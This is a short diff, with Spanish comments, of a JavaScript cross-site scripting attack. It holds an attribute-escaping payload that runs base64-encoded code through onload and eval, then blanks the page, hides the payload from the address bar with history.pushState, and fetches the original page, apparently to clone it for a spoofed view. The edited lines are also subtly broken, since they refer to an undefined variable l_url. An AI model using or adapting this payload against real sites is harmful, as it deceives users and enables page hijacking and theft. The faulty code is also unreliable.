@@ -4,11 +4,12 @@ var payload_vuln = "\"onload=\"eval(atob('Y29uc3Qgbm9kZSA9IGRvY3VtZW50LmNyZWF0ZU
 // Borramos el contenido para que parezca que sigue cargando
 document.body.innerHTML = '';
 // Esto cambia la URL que muestra el navegador, para que no se vea el payload
-var newUrl = window.location.href.replace(/\lang.*\)/i,'lang=ES-ES');
-history.pushState({ path: newUrl }, '', newUrl);
+let newUrl = new URL(window.location.href)
+l_url.searchParams.set(param_vuln, '')
+history.pushState({ path: newUrl.href }, '', newUrl.href);
 
 //Clona la web original
-fetch(newUrl)
+fetch(newUrl.href)
     .then(response => { return response.text() })
     .then(html => {
         const parser = new DOMParser();
